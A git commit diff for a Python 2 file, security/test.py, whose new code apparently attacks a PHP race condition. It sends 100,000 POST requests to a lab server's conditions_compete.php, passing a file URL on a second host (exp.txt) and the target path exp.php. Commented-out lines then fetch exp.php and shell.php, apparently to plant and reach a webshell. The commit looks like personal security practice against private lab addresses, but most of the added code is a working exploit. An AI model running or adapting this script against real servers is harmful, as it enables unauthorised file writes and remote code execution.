df83e71ef77dd22a2eaeb008d7bf5aa1b7f28d03
daitao <daitaomail@gmail.com>
2016-01-07 21:44:20 +0800

    test

--- security/test.py
+++ security/test.py
@@ -1,16 +1,60 @@
-#encoding:utf-8
+# encoding:utf-8
+
+from gevent import monkey
 
 import os
-from optparse import OptionParser, OptionGroup
+import sys
+import urllib
+import urllib2
+import requests
+import re
+import time
 
-def test1():
-	""" this function to test optparse"""
-	parser = OptionParser()
-	parser.add_option('-u', '--url', dest='url', help='this is webpage you want to go')
-	(options, args) = parser.parse_args()
-	print options.url, args
+from urllib import quote, unquote
+
+
+def test():
+
+    posturl = 'http://192.168.1.106/scripts/conditions_compete.php'
+    postdata = {
+        'file':'http://192.168.1.107/scripts/exp.txt',
+        'path':'exp.php'
+        }
+    geturl = 'http://192.168.1.106/scripts/exp.php'
+    shellurl = 'http://192.168.1.106/scripts/shell.php'
+
+    for i in xrange(100000):
+        post_res = requests.post(posturl, data=postdata)
+        if post_res:
+            print 'post status:', post_res.status_code
+        # print post_res.content
+        # get_res = requests.get(geturl)
+        # if get_res:
+            # print 'get_res status:', get_res.status_code
+        # res = requests.get(shellurl)
+        # if res:
+            # print res.status_code
+            # print res.history
+        # raw_input('test')
+
+def test2():
+
+    url = 'http://192.168.1.106/scripts/generate.php'
+
+    requests.get(url)
+
+
+
+def main():
+    pass
+
+
 
 if __name__ == '__main__':
-	os.system('printf "\033c"')
+    os.system('clear')
 
-	test1()
+    if len(sys.argv) == 2:
+        print 'args correct'
+    else:
+        print 'args error'
+
